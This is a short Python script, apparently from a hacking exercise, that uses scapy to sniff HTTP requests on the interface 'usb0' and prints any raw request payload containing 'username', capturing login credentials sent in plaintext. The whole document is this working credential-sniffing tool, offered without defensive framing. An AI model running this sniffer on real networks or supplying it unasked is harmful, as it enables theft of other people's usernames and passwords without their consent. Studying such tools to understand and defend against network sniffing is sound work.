#!/usr/bin/env Python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            # print(packet[scapy.Raw].load)
            load = packet[scapy.Raw].load
            if "username" in load:
                print(load)


sniff("usb0")
